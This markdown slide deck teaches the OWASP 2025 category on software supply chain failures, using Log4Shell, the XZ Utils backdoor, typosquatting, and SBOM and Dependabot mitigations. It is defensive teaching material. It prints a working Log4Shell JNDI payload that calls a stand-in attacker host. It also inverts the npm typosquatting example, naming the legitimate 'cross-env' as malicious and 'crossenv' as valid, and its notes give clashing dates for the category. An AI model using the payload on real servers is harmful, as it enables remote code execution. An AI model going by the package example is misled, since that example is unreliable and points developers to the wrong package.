## A03:2025 — Software Supply Chain Failures
CWE-494 / CWE-829 / CWE-1357

> Vulnerabilities introduced through third-party components,
> build pipelines, and update mechanisms. **New in 2025.**

Note: Log4Shell demonstrated that a single transitive dependency can compromise millions of systems. This category was elevated from A06 (Vulnerable Components) in 2021 to reflect the growing supply chain threat.

--

## How It Works

**Transitive dependency attack** — you don't use Log4j directly, but something you use does:

```
your-app
  └── some-framework v2.1
        └── logging-lib v3.4
              └── log4j-core 2.14.1  ← CVE-2021-44228
```

Note: JNDI = Java Naming and Directory Interface — a Java API that can trigger remote class loading. Log4Shell exploited JNDI lookups via LDAP (Lightweight Directory Access Protocol) to load and execute attacker code. Transitive dependency = a dependency of a dependency — not in your direct package list but still runs in your app.

--

**Typosquatting on npm:**
```bash
npm install cross-env # → malicious package, typo of valid 'crossenv'
```

![crossenv package.json](./assets/crossenv-package.webp)

--

## Real-World Examples

**Log4Shell — CVE-2021-44228 (December 2021)**
- Single line in log: `${jndi:ldap://attacker.com/exploit}` triggers RCE
- Affected: Apple, Amazon, Cloudflare, Tesla, US CISA systems
- **Impact**: millions of internet-facing servers, active exploitation within hours of disclosure

**XZ Utils Backdoor (CVE-2024-3094, March 2024)**
- Attacker spent 2 years building trust as maintainer, then inserted backdoor in release tarball
- Targeted: SSH daemon on systemd-linked Linux distros
- **Impact**: near-miss; caught before widespread deployment

Note: CVE = Common Vulnerabilities and Exposures — the global identifier for publicly known vulnerabilities, managed by MITRE. Log4Shell was given a CVSS score of 10.0 (maximum). The XZ Utils backdoor (CVE-2024-3094) was discovered by Microsoft engineer Andres Freund who noticed slightly elevated CPU usage in sshd — the backdoor was caught by accident, not by any security tooling.

--

## Mitigation

1. Maintain a **Software Bill of Materials (SBOM)** for all dependencies
2. Monitor **CVE/OSV feeds** continuously — automate patch PRs (renovate bot)
3. Pin dependency versions and **verify checksums** in CI

```yaml
# .github/dependabot.yml — automated dependency updates
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 10
```

```bash
# Generate SBOM with Syft
syft packages . -o cyclonedx-json > sbom.json

# Scan SBOM for known vulnerabilities
grype sbom:./sbom.json
```

Note: SBOM = Software Bill of Materials. CI = Continuous Integration. IaC = Infrastructure as Code. OSV = Open Source Vulnerabilities — Google's open vulnerability database.

--

## References & Tools

| Resource | Details |
|---|---|
| [OWASP Supply Chain Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Software_Supply_Chain_Security_Cheat_Sheet.html) | Controls & patterns |
| `npm audit` / `yarn audit` | Built-in vulnerability scanning |
| [Snyk](https://snyk.io) | Dep scanning + auto fix PRs |
| [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/) | Open-source SCA |
| Syft + Grype | SBOM generation + scanning |
| Sigstore / Cosign | Artifact signing & verification |

Note: SBOM = Software Bill of Materials — a formal, machine-readable inventory of all software components and their versions, including transitive dependencies. OSV = Open Source Vulnerabilities — Google's open vulnerability database (osv.dev). SCA = Software Composition Analysis — tools that compare dependency lists against vulnerability databases. Syft generates SBOMs; Grype scans them against OSV/NVD/GitHub Advisory feeds.
